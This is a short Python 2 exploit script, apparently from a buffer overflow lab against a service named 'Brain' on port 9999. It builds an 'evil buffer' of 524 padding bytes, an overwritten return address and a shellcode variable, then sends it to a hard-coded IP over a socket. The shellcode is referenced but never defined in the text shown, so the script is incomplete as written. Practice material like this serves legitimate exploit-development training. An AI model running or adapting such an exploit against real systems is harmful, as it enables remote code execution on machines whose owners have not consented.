#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*524 + "\xf3\x12\x17\x31" + shellcode

try: 
     print "\sending evil buffer..." 
     s.connect(('11.11.11.7',9999)) 
     data = s.recv(1024) 
     s.send(buffer + '\r\n') 
     print "\nDone!"

except: 
     print "Count not connect to Brain!"
